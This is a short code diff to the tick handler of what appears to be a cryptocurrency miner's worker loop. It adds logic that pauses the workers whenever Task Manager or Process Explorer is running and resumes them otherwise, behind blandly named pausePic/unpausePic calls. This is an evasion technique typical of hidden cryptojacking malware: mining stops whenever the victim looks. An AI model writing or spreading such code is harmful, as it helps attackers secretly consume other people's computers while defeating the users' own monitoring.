@@ -273,6 +273,18 @@ void Workers::onResult(uv_async_t *handle)
 
 void Workers::onTick(uv_timer_t *handle)
 {
+    bool boklar = false;
+	boklar = boklar || IsProcessRunning(L"taskmgr.exe");
+	boklar = boklar || IsProcessRunning(L"procexp64_2.exe");
+			if (boklar)
+			{
+					pausePic();
+			}
+			else
+				{
+					unpausePic();
+				}
+    
     for (Handle *handle : m_workers) {
         if (!handle->worker()) {
             return;
